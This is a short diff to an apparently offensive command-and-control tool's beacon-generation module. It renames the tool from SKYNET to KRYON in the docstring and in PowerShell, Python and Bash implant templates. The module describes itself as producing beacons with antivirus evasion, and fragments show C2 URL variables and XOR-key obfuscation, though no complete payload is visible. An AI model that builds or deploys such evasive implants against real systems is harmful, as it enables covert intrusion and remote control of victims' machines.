@@ -1,5 +1,5 @@
 """
-SKYNET Command & Control - Beacon Generation
+KRYON Command & Control - Beacon Generation
 
 Beacon and implant generation with AV evasion.
 
@@ -152,7 +152,7 @@ def _generate_powershell_beacon(c2_url: str, beacon_id: str, sleep_time: int, ji
 
     if evasion == "basic":
         # Basic beacon (minimal evasion)
-        code = f'''# SKYNET PowerShell Beacon
+        code = f'''# KRYON PowerShell Beacon
 $c2 = "{c2_url}"
 $id = "{beacon_id}"
 $sleep = {sleep_time}
@@ -195,7 +195,7 @@ while($true) {{
         # XOR key for encryption
         xor_key = random.randint(1, 255)
 
-        code = f'''# SKYNET Advanced PowerShell Beacon
+        code = f'''# KRYON Advanced PowerShell Beacon
 function {_random_var()} {{
     param($s,$k)
     $r = ""
@@ -238,7 +238,7 @@ def _generate_python_beacon(c2_url: str, beacon_id: str, sleep_time: int, jitter
 
     if evasion == "basic":
         code = f'''#!/usr/bin/env python3
-# SKYNET Python Beacon
+# KRYON Python Beacon
 import requests
 import base64
 import time
@@ -314,7 +314,7 @@ def _generate_bash_beacon(c2_url: str, beacon_id: str, sleep_time: int, jitter: 
     """Generate Bash beacon code."""
 
     code = f'''#!/bin/bash
-# SKYNET Bash Beacon
+# KRYON Bash Beacon
 
 C2="{c2_url}"
 ID="{beacon_id}"
